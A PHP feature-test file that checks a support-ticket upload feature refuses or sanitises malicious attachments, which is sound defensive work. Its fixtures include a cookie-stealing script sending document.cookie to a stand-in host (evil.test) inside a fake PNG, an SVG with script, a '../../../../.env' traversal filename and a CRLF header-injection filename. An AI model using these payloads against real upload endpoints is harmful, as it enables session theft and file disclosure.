<?php

declare(strict_types=1);

namespace Tests\Feature\Support;

use Illuminate\Http\UploadedFile;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Str;
use Lynomia\Modules\Support\Infrastructure\Models\SupportAttachment;
use PHPUnit\Framework\Attributes\Test;

/**
 * A support queue is a channel by which strangers hand files to the people who
 * can see every customer's data. These are the ways that goes wrong.
 */
final class AttachmentsCannotBeTurnedIntoAnAttackTest extends SupportTestCase
{
    /** @var list<string> */
    private array $temporaryFiles = [];

    protected function setUp(): void
    {
        parent::setUp();

        Storage::fake('local');
    }

    protected function tearDown(): void
    {
        foreach ($this->temporaryFiles as $path) {
            @unlink($path);
        }

        $this->temporaryFiles = [];

        parent::tearDown();
    }

    /**
     * A real file on disk with real bytes in it.
     *
     * `UploadedFile::fake()` cannot be used for any of these: its
     * `getMimeType()` answers from the *filename*, so a test written against
     * it would prove that the platform trusts the extension — which is
     * precisely the thing these tests exist to show it does not. A real file
     * makes `getMimeType()` run the content guesser, which is what runs in
     * production.
     */
    private function fileContaining(string $name, string $content): UploadedFile
    {
        $path = sys_get_temp_dir().'/lynomia-attachment-'.Str::random(12);
        file_put_contents($path, $content);
        $this->temporaryFiles[] = $path;

        // `test: true` is what lets a file that did not arrive over HTTP be
        // treated as an upload. Type and error are left null so that nothing
        // about the type is asserted by the test itself.
        return new UploadedFile($path, $name, null, null, true);
    }

    /**
     * @return array<string, mixed>
     */
    private function ticketPayload(): array
    {
        return [
            'subject' => 'Log attached',
            'body' => 'Here is the output.',
            'category' => 'technical',
            'priority' => 'normal',
        ];
    }

    #[Test]
    public function a_plain_text_log_is_accepted_and_stored_privately(): void
    {
        [$customer, $owner] = $this->accountWithOwner();

        $this->actingAs($owner)->withHeaders($this->actingFor($customer))
            ->post('/api/v1/support/tickets', $this->ticketPayload() + [
                'attachments' => [$this->fileContaining('syslog.txt', "Sep  8 09:00 sshd: refused\n")],
            ], ['Accept' => 'application/json'])
            ->assertCreated();

        /** @var SupportAttachment $attachment */
        $attachment = SupportAttachment::query()->firstOrFail();

        $this->assertSame('syslog.txt', $attachment->original_name);
        $this->assertSame('text/plain', $attachment->mime_type);

        // The stored path is generated and contains no part of the name the
        // uploader chose.
        $this->assertStringNotContainsString('syslog', $attachment->path);
        Storage::disk('local')->assertExists($attachment->path);
    }

    #[Test]
    public function an_html_document_wearing_a_png_name_is_refused(): void
    {
        [$customer, $owner] = $this->accountWithOwner();

        // The client will claim image/png for a file called screenshot.png.
        // The platform reads the bytes, which say text/html, and refuses —
        // serving this back as an image is stored cross-site scripting.
        $disguised = $this->fileContaining(
            'screenshot.png',
            '<html><head><title>x</title></head><body><script>fetch("https://evil.test/"+document.cookie)</script></body></html>',
        );

        $this->actingAs($owner)->withHeaders($this->actingFor($customer))
            ->post('/api/v1/support/tickets', $this->ticketPayload() + ['attachments' => [$disguised]], ['Accept' => 'application/json'])
            ->assertStatus(422)
            ->assertJsonPath('error.code', 'support.attachment_type_not_allowed');

        $this->assertDatabaseCount('support_attachments', 0);
    }

    #[Test]
    public function an_svg_is_refused_however_it_is_labelled(): void
    {
        [$customer, $owner] = $this->accountWithOwner();

        // An SVG is a document that can carry script. It is deliberately not
        // on the allow list even though it is genuinely an image format.
        $svg = $this->fileContaining(
            'diagram.svg',
            '<?xml version="1.0"?><svg xmlns="http://www.w3.org/2000/svg" width="10" height="10"><script>alert(1)</script></svg>',
        );

        $this->actingAs($owner)->withHeaders($this->actingFor($customer))
            ->post('/api/v1/support/tickets', $this->ticketPayload() + ['attachments' => [$svg]], ['Accept' => 'application/json'])
            ->assertStatus(422);

        $this->assertDatabaseCount('support_attachments', 0);
    }

    #[Test]
    public function a_traversing_filename_cannot_escape_the_storage_directory(): void
    {
        [$customer, $owner] = $this->accountWithOwner();

        $traversal = $this->fileContaining('../../../../.env', "APP_KEY=stolen and nothing else at all in this file\n");

        $this->actingAs($owner)->withHeaders($this->actingFor($customer))
            ->post('/api/v1/support/tickets', $this->ticketPayload() + ['attachments' => [$traversal]], ['Accept' => 'application/json'])
            ->assertCreated();

        /** @var SupportAttachment $attachment */
        $attachment = SupportAttachment::query()->firstOrFail();

        // The name is kept for display, flattened to a basename; the path is
        // generated and lives under the ticket's own directory.
        $this->assertStringNotContainsString('..', $attachment->original_name);
        $this->assertStringNotContainsString('..', $attachment->path);
        $this->assertStringStartsWith('support/', $attachment->path);
    }

    #[Test]
    public function a_filename_carrying_a_newline_cannot_forge_a_download_header(): void
    {
        [$customer, $owner] = $this->accountWithOwner();

        $injected = $this->fileContaining(
            "note.txt\r\nX-Injected: yes",
            'nothing to see here, just a short plain text note',
        );

        $this->actingAs($owner)->withHeaders($this->actingFor($customer))
            ->post('/api/v1/support/tickets', $this->ticketPayload() + ['attachments' => [$injected]], ['Accept' => 'application/json'])
            ->assertCreated();

        /** @var SupportAttachment $attachment */
        $attachment = SupportAttachment::query()->firstOrFail();

        $this->assertStringNotContainsString("\r", $attachment->original_name);
        $this->assertStringNotContainsString("\n", $attachment->original_name);
    }

    #[Test]
    public function a_download_is_served_as_an_attachment_that_a_browser_will_not_execute(): void
    {
        [$customer, $owner] = $this->accountWithOwner();

        $this->actingAs($owner)->withHeaders($this->actingFor($customer))
            ->post('/api/v1/support/tickets', $this->ticketPayload() + [
                'attachments' => [$this->fileContaining('report.txt', 'a plain text report with enough bytes to be recognisable')],
            ], ['Accept' => 'application/json'])
            ->assertCreated();

        /** @var SupportAttachment $attachment */
        $attachment = SupportAttachment::query()->firstOrFail();

        $response = $this->actingAs($owner)->withHeaders($this->actingFor($customer))
            ->get("/api/v1/support/attachments/{$attachment->getKey()}")
            ->assertOk();

        $this->assertStringContainsString('attachment', (string) $response->headers->get('Content-Disposition'));
        $this->assertSame('nosniff', $response->headers->get('X-Content-Type-Options'));
    }

    #[Test]
    public function a_file_larger_than_the_limit_is_refused(): void
    {
        [$customer, $owner] = $this->accountWithOwner();

        config()->set('support.attachments.max_bytes', 1024);

        $this->actingAs($owner)->withHeaders($this->actingFor($customer))
            ->post('/api/v1/support/tickets', $this->ticketPayload() + [
                'attachments' => [$this->fileContaining('big.txt', str_repeat('x', 4096))],
            ], ['Accept' => 'application/json'])
            ->assertStatus(422);

        $this->assertDatabaseCount('support_attachments', 0);
    }
}
